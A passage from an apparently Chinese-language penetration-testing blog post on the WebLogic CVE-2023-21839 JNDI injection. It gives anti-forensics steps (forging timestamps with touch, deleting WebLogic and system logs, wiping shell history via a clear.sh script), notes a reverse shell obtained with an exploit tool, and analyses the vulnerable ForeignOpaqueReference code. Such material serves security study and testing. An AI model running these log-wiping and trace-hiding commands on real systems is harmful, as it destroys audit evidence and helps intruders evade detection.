<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121742343.png"><img src="/CVE-Test/image-20231201121742343.png" alt="image-20231201121742343"></a></p>
<p>时间一致，所以命令修改一下即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> css</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121843879.png"><img src="/CVE-Test/image-20231201121843879.png" alt="image-20231201121843879"></a></p>
<h4 id="删除weblogic服务日志"><a href="#删除weblogic服务日志" class="headerlink" title="删除weblogic服务日志"></a>删除weblogic服务日志</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/u</span>ser_projects<span class="regexp">/domains/</span>base_domain<span class="regexp">/servers/</span>AdminServer/logs</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124945937.png"><img src="/CVE-Test/image-20231201124945937.png" alt="image-20231201124945937"></a></p>
<p>主要是一些服务启动日志和访问情况日志，可以直接都删除，除了文件夹可以保留</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125234934.png"><img src="/CVE-Test/image-20231201125234934.png" alt="image-20231201125234934"></a></p>
<p>然后将日志目录修改时间改一下，和其他一致</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125315971.png"><img src="/CVE-Test/image-20231201125315971.png" alt="image-20231201125315971"></a></p>
<p>执行命令，</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11292033</span> ./</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125405018.png"><img src="/CVE-Test/image-20231201125405018.png" alt="image-20231201125405018"></a></p>
<h4 id="删除系统日志"><a href="#删除系统日志" class="headerlink" title="删除系统日志"></a>删除系统日志</h4><p>文件时间修改完了就是删除命令历史记录以及日志文件，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">histroy -r          <span class="comment">#删除当前会话历史记录</span></span><br><span class="line"><span class="built_in">history</span> -c          <span class="comment">#删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">rm</span> .bash_history   <span class="comment">#删除历史文件中的内容</span></span><br><span class="line">HISTZISE=0          <span class="comment">#通过设置历史命令条数来清除所有历史记录</span></span><br></pre></td></tr></table></figure>

<p>再使用vim打开，执行下面命令，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p>然后再删除日志文件</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/<span class="keyword">run</span>/utmp 记录现在登入的用户</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp 记录用户所有的登入和登出</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog 记录每一个用户最后登入时间</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/btmp 记录错误的登入尝试</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span> 需要身份确认的操作</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/secure 记录安全相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/maillog 记录邮件相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/message 记录系统启动后的信息和错误日志</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/cron 记录定时任务相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/spooler 记录UUCP和<span class="keyword">news</span>设备相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/<span class="keyword">boot</span>.<span class="keyword">log</span> 记录守护进程启动和停止相关的日志消息</span><br></pre></td></tr></table></figure>

<p>最后汇总可以一个脚本解决问题，只是vim需要自己操作一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/.bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>

<p>首先来到用户目录~，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201122459733.png"><img src="/CVE-Test/image-20231201122459733.png" alt="image-20231201122459733"></a></p>
<p>生成清除痕迹脚本文件，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124049869.png"><img src="/CVE-Test/image-20231201124049869.png" alt="image-20231201124049869"></a></p>
<p>然后赋执行权限，</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 <span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201124410575.png"><img src="/CVE-Test/image-20231201124410575.png" alt="image-20231201124410575"></a></p>
<p>然后清空vim记录，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201123307378.png"><img src="/CVE-Test/image-20231201123307378.png" alt="image-20231201123307378"></a></p>
<p>最后删掉.viminfo ，其中有大量当前用户执行的用vim生成的文档日志</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201123614967.png"><img src="/CVE-Test/image-20231201123614967.png" alt="image-20231201123614967"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> .viminfo</span><br></pre></td></tr></table></figure>

<p>最后再次执行脚本清空系统日志和命令执行历史，因为是weblogic服务，所以没有用httpd，所以没有日志。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201122754841.png"><img src="/CVE-Test/image-20231201122754841.png" alt="image-20231201122754841"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125647334.png"><img src="/CVE-Test/image-20231201125647334.png" alt="image-20231201125647334"></a></p>
<p>最后一步删除clear.sh，再修改时间，即可</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rm</span> <span class="keyword">clear</span>.<span class="keyword">sh</span>;touch -t 11270436 ./ </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201125831451.png"><img src="/CVE-Test/image-20231201125831451.png" alt="image-20231201125831451"></a></p>
<p>痕迹清理完成，渗透完毕</p>
<h3 id="附加用java工具"><a href="#附加用java工具" class="headerlink" title="附加用java工具"></a>附加用java工具</h3><p>在java17环境下运行脚本发生问题，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201213653846.png"><img src="/CVE-Test/image-20231201213653846.png" alt="image-20231201213653846"></a></p>
<p>这个错误是由于Java 9中已经弃用了java.corba模块（例如，org.omg.CORBA*包），而在Java 11中，该模块已经不再可用。弃用模块意味着默认情况下，模块中的类在类路径中不可用。</p>
<p>对于Java 9和10，你需要在命令行中包含<code>--add-module java.corba</code>选项以将它们添加到类路径。但是，这个选项在Java 11中不可用。</p>
<p>所以对于Java 11以及之后的版本，需要从在线资源中下载GlassFish CORBA JAR文件，并将它们添加到Java 11的类路径，</p>
<ul>
<li>glassfish-corba-omgapi.jar</li>
<li>glassfish-corba-orb.jar</li>
<li>glassfish-corba-internal-api.jar</li>
<li>pfl-basic.jar</li>
<li>pfl-tf.jar</li>
</ul>
<p>当然最简单的就是切换工具所在java环境降低版本，于是我将主机的java环境降低为<code>jdk1.8.0_171</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201213957613.png"><img src="/CVE-Test/image-20231201213957613.png" alt="image-20231201213957613"></a></p>
<p>就可以成功执行，并成功反弹shell</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201214138728.png"><img src="/CVE-Test/image-20231201214138728.png" alt="image-20231201214138728"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201214155986.png"><img src="/CVE-Test/image-20231201214155986.png" alt="image-20231201214155986"></a></p>
<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>该漏洞的形成由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功<code>WebLogic Server</code>可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p>
<p>而t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过<code>lookup</code>查看，当远程对象继承自<code>OpaqueReference</code>时，<code>lookup</code>查看远程对象，服务端会调用远程对象<code>getReferent</code>方法。<code>weblogic.deployment.jms.ForeignOpaqueReference</code>继承自<code>OpaqueReference</code>并且实现了<code>getReferent</code>方法，并且存在<code>retVal = context.lookup(this.remoteJNDIName)</code>实现，故可以通过<code>rmi/ldap</code>远程协议进行远程命令执行。</p>
<p>t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。</p>
<p>所以其本质还是jndi注入，控制lookup函数的参数，这样来使客户端访问恶意的RMI或者LDAP服务来加载恶意的对象，从而执行代码。在JNDI服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用Reference类实现的。Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。具体则是指如果远程获取RMI服务器上的对象为Reference类或者其子类时，则可以从其他服务器上加载class字节码文件来实例化。</p>
<h2 id="漏洞点代码分析"><a href="#漏洞点代码分析" class="headerlink" title="漏洞点代码分析"></a>漏洞点代码分析</h2><p>该漏洞的形成主要原因是<code>ForeignOpaqueReference</code>类的问题于是查看这个类代码跟进分析，打开<code>com.oracle.weblogic.deployment.jar</code>包查看，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203947464.png"><img src="/CVE-Test/image-20231204203947464.png" alt="image-20231204203947464"></a></p>
<p><code>ForeignOpaqueReference</code>类的<code>getReferent()</code>方法是造成这个漏洞的主要原因，该方法是<code>OpaqueReference</code>接口的实现方法，在<code>getReferent()</code>方法中，<code>retVal = context.lookup(this.remoteJNDIName);</code> 对本类<code>remoteJNDIName</code>变量中的<code>JNDI</code>地址进行远程加载，导致了反序列化漏洞。</p>
<p>但是实际上，反序列化过程中没有进行恶意操作,在完成反序列化过程后执行了漏洞类<code>ForeignOpaqueReference</code>中<code>getReferent()</code>方法中的<code>lookup()</code>才触发的漏洞。</p>
<p>分析该方法代码，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203928772.png"><img src="/CVE-Test/image-20231204203928772.png" alt="image-20231204203928772"></a></p>
<p>发现在该方法中利用了<code>lookup</code>方法，但是发现其对<code>remoteJNDIName</code>用方法<code>evalMarocs</code>进行了过滤，所以这里很有可能就是漏洞点限制方法不完全导致这里可以进行<code>jndi</code>注入。</p>
<p>再查找何处调用了<code>getReferent</code>方法，如何向这个方法传参，可以先看看<code>remoteJNDIName</code>和<code>jndiEnvironment</code>参数的定义和传递，这两个参数都是<code>ForeignOpaqueReference</code>类定义的私有变量。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231204203913643.png"><img src="/CVE-Test/image-20231204203913643.png" alt="image-20231204203913643"></a></p>
<p>这两个变量的主要作用是在进行<code>lookup</code>操作之前，用于检查 JNDI 环境是否已正确配置以访问远程资源。 </p>
<p>继续分析图16中代码，发现其中只需要让一个条件为真，即可调用<code>retVal = context.lookup(evalMacros(this.remoteJNDIName))</code>，而所有条件为假才会开始检测<code>cachedReferent</code>。</p>
<p>分析条件语句，<code>if (this.jndiEnvironment == null || !AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)) || this.remoteJNDIName == null || !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>，如果要条件为真只有以下几种情况：</p>
<blockquote>
<ul>
<li><p>条件1 <code>(this.jndiEnvironment == null)</code>: 检查 <code>jndiEnvironment</code> 是否为 <code>null</code>。如果 <code>jndiEnvironment</code> 为 <code>null</code>，条件为真。</p>
</li>
<li><p>条件2 <code>(!AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)))</code>: 检查 <code>jndiEnvironment</code> 中的 “<code>java.naming.factory.initial</code>“ 属性是否不等于预定义的值 <code>AQJMS_ICF</code>。如果不等于，条件为真。</p>
</li>
<li><p>条件3 <code>(this.remoteJNDIName == null)</code>: 检查 <code>remoteJNDIName</code> 是否为 <code>null</code>。如果 <code>remoteJNDIName</code> 为 null，条件为真。</p>
</li>
<li><p>条件4 <code>(!this.remoteJNDIName.startsWith(AQJMS_QPREFIX))</code>: 检查 <code>remoteJNDIName</code> 是否不以预定义的值 <code>AQJMS_QPREFIX</code> 开头。如果不以该前缀开头，条件为真。</p>
</li>
<li><p>条件5 <code>(!this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>: 检查 <code>remoteJNDIName</code> 是否不以预定义的值 <code>AQJMS_TPREFIX</code> 开头。如果不以该前缀开头，条件为真。</p>
</li>
</ul>
</blockquote>
<p>开始本来想让<code>jndiEnvironment</code>直接为空，这样条件语句就成立了， 但是却无法对<code>InitialContext</code>进行赋值初始化，而<code>remoteJNDIName</code>为空也不可以，因为它是<code>JNDI</code>注入的关键参数。所以只要<code>!AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code>或者<code>!this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX))</code>满足即可。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/a.png"><img src="/CVE-Test/a.png" alt="a"></a></p>
<p>而<code>jndiEnvironment</code>和<code>remoteJNDIName</code>的值都可以通过反射赋值控制，再通过<code>retVal = context.lookup(evalMacros(this.remoteJNDIName))</code>执行，便可以利用<code>rmi/ldap</code>远程协议进行命令执行。</p>

    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\CMS-Test\" rel="bookmark">漏洞测试</a></div>
    </li>
  </ul>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/CMS-Test/" rel="prev" title="漏洞测试">
      <i class="fa fa-chevron-left"></i> 漏洞测试
    </a></div>
      <div class="post-nav-item">
    <a href="/Go/" rel="next" title="golang">
      golang <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-44228-Log4j2"><span class="nav-number">1.</span> <span class="nav-text">CVE-2021-44228 Log4j2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-solr-8-11-0%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.1.1.</span> <span class="nav-text">Apache solr 8.11.0下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.2.</span> <span class="nav-text">JAVA配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%8E%8B%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">解压到对应目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%A8%E7%BD%B2%E5%B9%B6%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">部署并修改环境变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">查看版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solr%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.1.3.</span> <span class="nav-text">Solr下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-Apache-Solr%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.1.4.</span> <span class="nav-text">安装 Apache Solr服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%8A%9F"><span class="nav-number">1.1.5.</span> <span class="nav-text">成功</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">了解漏洞描述与注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Log4j2-Lookup"><span class="nav-number">1.2.1.</span> <span class="nav-text">Log4j2 Lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">1.2.2.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.3.</span> <span class="nav-text">JNDI注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">脚本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">1.3.1.</span> <span class="nav-text">信息泄露脚本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LDAP-HEADER"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">LDAP_HEADER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThreadedTCPRequestHandler"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">ThreadedTCPRequestHandler</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThreadedTCPServer"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">ThreadedTCPServer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">main()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">1.4.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DNSlog%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.1.</span> <span class="nav-text">利用DNSlog验证漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.2.</span> <span class="nav-text">信息泄露漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.3.</span> <span class="nav-text">远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDIExploit-1-2-SNAPSHOT-jar%E5%88%A9%E7%94%A8JNDI%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2023-21839-Weblogic%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">CVE-2023-21839 Weblogic远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">2.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.1.</span> <span class="nav-text">概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#weblogic%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">weblogic是什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#T3%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">T3的概念和交互过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iiop%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">iiop概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCORBA"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">什么是CORBA</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-number">2.1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.3.</span> <span class="nav-text">渗透流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">远程代码执行原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">JAVA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GO"><span class="nav-number">2.1.3.3.</span> <span class="nav-text">GO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AC%E7%BD%91%E6%B5%8B%E8%AF%95"><span class="nav-number">2.1.3.4.</span> <span class="nav-text">公网测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">2.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="nav-number">2.2.1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEjava%E7%8E%AF%E5%A2%83"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">配置java环境</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.2.1.1.1.</span> <span class="nav-text">查看版本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85weblogic"><span class="nav-number">2.2.2.</span> <span class="nav-text">安装weblogic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.3.</span> <span class="nav-text">安装完成后，启动服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E6%80%A7%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.4.</span> <span class="nav-text">漏洞存在性测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.5.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">2.2.6.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">2.2.7.</span> <span class="nav-text">痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4"><span class="nav-number">2.2.7.1.</span> <span class="nav-text">修改时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4weblogic%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97"><span class="nav-number">2.2.7.2.</span> <span class="nav-text">删除weblogic服务日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="nav-number">2.2.7.3.</span> <span class="nav-text">删除系统日志</span></a></li></ol></li><li class="nav-item nav-level-3"><a 